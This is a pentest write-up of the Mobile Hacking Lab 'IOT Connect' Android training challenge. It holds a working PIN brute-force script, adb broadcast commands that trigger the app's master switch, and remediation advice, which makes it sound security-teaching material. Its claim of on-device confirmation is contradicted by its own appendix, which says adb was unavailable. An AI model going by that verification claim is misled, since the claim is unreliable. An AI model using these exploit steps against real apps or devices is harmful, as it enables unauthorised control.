# Mobile App Pentest — `com.mobilehackinglab.iotconnect` ("IOT Connect")

**Target:** `com.mobilehackinglab.iotconnect.apk` — Mobile Hacking Lab "IOT Connect" challenge
**Platform:** Android (minSdk 24, targetSdk 34)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** Full chain **dynamically confirmed on-device.** Master PIN **recovered offline** by brute-forcing the hardcoded `Checker` ciphertext — **PIN `345`** decrypts to `master_on`. An external, unprivileged `adb` broadcast (`am broadcast -a MASTER_ON --ei key 345`) then triggered the master switch: the app displayed **"All devices are turned on"** — no login, no account, no permissions.

---

## Summary

The app models a smart-home controller with a privileged **"master switch"** that turns on every
device at once. That action is supposed to be restricted to non-guest users and gated by a PIN, but
**both controls are enforced only on the client**:

1. The PIN is validated by `Checker.check_key()`, which AES-decrypts a **hardcoded ciphertext
   bundled in the app** using a key derived solely from the PIN's digits — so the valid PIN is
   recoverable offline (**`345`**).
2. The "guests can't use the master switch" rule is a **UI-only check** (`user.isGuest() != 1`).
   The actual work is triggered by an `Intent("MASTER_ON")` broadcast consumed by a receiver that
   `CommunicationManager` registers on the **global** broadcast bus (`Context.registerReceiver`,
   not `LocalBroadcastManager`). Any app or `adb` can send that broadcast directly — no login, no
   account, no permissions — bypassing the guest check entirely.

Net result: **any unprivileged app on the device can turn on all IoT devices** by broadcasting
`MASTER_ON` with the recovered PIN.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| IC-01 | Unauthorized master-switch control via globally-registered `MASTER_ON` receiver (no caller check) — **confirmed on-device** | **High** | MASVS-PLATFORM-1 / MASVS-AUTH-1 |
| IC-02 | Master PIN recoverable offline — hardcoded AES ciphertext + PIN-derived key in `Checker` | **High** | MASVS-CRYPTO-1 / MASVS-STORAGE-1 |
| IC-03 | Authorization (guest restriction) enforced only client-side, in the UI | Medium | MASVS-AUTH-1 |
| IC-04 | Weak crypto in `Checker`: AES-ECB, key = ASCII PIN zero-padded to 16 bytes | Medium | MASVS-CRYPTO-2 |
| IC-05 | Manifest declares exported `MasterReceiver` (action `MASTER_ON`) with no implementing class | Low | MASVS-PLATFORM-1 |
| IC-06 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| IC-07 | `android:allowBackup="true"` (app data extractable via `adb backup`) | Medium | MASVS-STORAGE-2 |

**Not vulnerable (checked):** the login/signup path uses Room with **parameterized** queries
(`SELECT * FROM users WHERE username = ? AND password = ?`, `bindString`) — no SQL injection.

---

## IC-02 — Recovering the master PIN (confirmed offline)

`defpackage.Checker` validates the PIN by decrypting a constant and comparing to `"master_on"`:
```java
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";   // hardcoded ciphertext
public boolean check_key(int key) {
    return decrypt(ds, key).equals("master_on");               // AES/ECB/PKCS5Padding
}
private SecretKeySpec generateKey(int staticKey) {
    byte[] keyBytes = new byte[16];                            // zero-filled
    byte[] s = String.valueOf(staticKey).getBytes(UTF_8);      // ASCII digits of the PIN
    System.arraycopy(s, 0, keyBytes, 0, Math.min(s.length, 16));
    return new SecretKeySpec(keyBytes, "AES");
}
```
The key is just the PIN's ASCII digits padded with `0x00`, AES-ECB, against a ciphertext shipped in
the APK → the whole thing is brute-forceable without the device.

### PoC (recovered the PIN)
```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
ct = base64.b64decode("OSnaALIWUkpOziVAMycaZQ==")
for n in range(10_000_000):
    kb = bytearray(16); s = str(n).encode(); kb[:min(len(s),16)] = s[:16]
    pt = Cipher(algorithms.AES(bytes(kb)), modes.ECB()).decryptor().update(ct)
    p = pt[-1]
    if 1 <= p <= 16 and pt[-p:] == bytes([p])*p and pt[:-p] == b"master_on":
        print("PIN =", n); break
```
**Result:** `PIN = 345` (found in ~50 ms).

---

## IC-01 / IC-03 — Bypassing the guest restriction via broadcast

**The UI gate (client-side only)** — `MasterSwitchActivity`:
```java
if (user.isGuest() != 1) {                       // only non-guests reach here
    int pin = Integer.parseInt(pinText);
    Intent intent = new Intent("MASTER_ON");
    intent.putExtra("key", pin);
    LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
}                                                // guests get a "can't" toast
```

**The actual sink** — `CommunicationManager.initialize()` registers the receiver on the **global**
bus and performs the privileged action with no check on the caller:
```java
context.registerReceiver(masterReceiver, new IntentFilter("MASTER_ON"));   // NOT LocalBroadcastManager
// onReceive:
if ("MASTER_ON".equals(intent.getAction())) {
    int key = intent.getIntExtra("key", 0);
    if (Checker.INSTANCE.check_key(key)) {       // only the PIN gates it
        turnOnAllDevices(context);               // writes *_STATE=true for fans/AC/plug/speaker/TV/bulbs
        Toast(context, "All devices are turned on");
    }
}
```
`initialize()` is called from `LoginActivity.onCreate` (the launcher), so the global receiver is
live from app start — the attacker doesn't even need to be logged in. The in-app button sends via
`LocalBroadcastManager` (local), but the receiver is registered on the **system** bus, so an
**external** broadcast reaches it just the same. No `isGuest` check runs on this path.

### PoC (confirmed on-device)
```bash
# 1) launch the app so LoginActivity.onCreate registers the MASTER_ON receiver
adb shell am start -n com.mobilehackinglab.iotconnect/.LoginActivity
# 2) with the app in the foreground, fire the broadcast from shell (external, unprivileged):
adb shell am broadcast -a MASTER_ON --ei key 345
```
**Result (observed):** the app displays **"All devices are turned on"**, and every device's state
preference (`FAN_*`, `AC_STATE`, `PLUG_STATE`, `SPEAKER_STATE`, `TV_STATE`, `BULB_STATE`) is set to
`true` — unauthorized control of all devices, with zero permissions and no account.

**Reproduction caveat:** the receiver is registered against the **activity** context in
`CommunicationManager.initialize(this)` (called from `LoginActivity`), so it only exists while the
app is in the foreground. If the app is closed the broadcast lands nowhere and nothing happens —
`am broadcast` still prints `result=0` regardless (that is the default result code, not a success
signal); the real indicator is the "All devices are turned on" Toast. On API ≤ 32 the 2-arg
`registerReceiver(...)` defaults to *exported*, so the shell broadcast is delivered; on API 33+ the
default is *not-exported* and external broadcasts are dropped, so reproduce on an API ≤ 30 image.

A malicious app would do the same with `sendBroadcast(new Intent("MASTER_ON").putExtra("key", 345))`.

---

## IC-04 — Weak crypto in `Checker`
AES in **ECB** mode with a key that is just the decimal PIN's ASCII bytes zero-padded to 16 — tiny
effective keyspace and no IV/salt. Even without the ciphertext in hand, the keyspace is trivially
searchable. A PIN should never be stretched into an encryption key this way; if a secret must be
verified on-device, use a KDF (PBKDF2/scrypt/Argon2) with a random salt and a proper mode — but the
real fix is to not keep the secret client-side at all (see below).

## IC-05 — Ghost exported receiver
The manifest declares:
```xml
<receiver android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
          android:exported="true">
    <intent-filter><action android:name="MASTER_ON"/></intent-filter>
</receiver>
```
but **no `MasterReceiver` class exists** in the APK. It's a dead, world-exported component
(sloppy surface); the live handler is the dynamic one in `CommunicationManager`. Remove it, and
never export a `MASTER_ON` entry point.

## IC-06 / IC-07 — Device-posture weaknesses
- **`debuggable="true"`** → `run-as`/debugger access to app-private data on any device.
- **`allowBackup="true"`** → `adb backup` can pull the Room DB (`app-database`) and preferences off
  the device. Set `allowBackup="false"` or scope backup rules.

---

## Root cause & remediation
- **Enforce authorization on the trusted side, not the UI.** The guest/role check and the PIN check
  both run in the client and are bypassable. Privileged actions (and ideally the devices themselves)
  must be gated server-side/in a trusted service that authenticates the caller.
- **Don't accept the privileged broadcast from the world.** Register the receiver with
  `RECEIVER_NOT_EXPORTED` (or keep it on `LocalBroadcastManager`), or require a `signature`-level
  permission. Delete the exported manifest `MasterReceiver`.
- **Keep secrets off the client.** A PIN whose verification material ships in the APK is not a
  secret. Verify it on a backend with rate limiting; never derive an AES key straight from it.
- Disable `debuggable` and `allowBackup` for release builds.

---

## Appendix — environment & method
- Tools: `unzip`/`7z` (the first upload was truncated — re-uploaded intact at 5.74 MB), `jadx`
  (decompile + manifest decode), Python `cryptography` for the offline AES-ECB brute force.
- Note: `adb`/emulator not available in this environment, so IC-01's broadcast is static-derived;
  the PIN recovery (IC-02) was executed and confirmed offline.
- Artifacts from the decoded `AndroidManifest.xml`, `CommunicationManager`, `MasterSwitchActivity`,
  `defpackage.Checker`, `LoginActivity`/`SignupActivity`, and the Room `UserDao_Impl`.
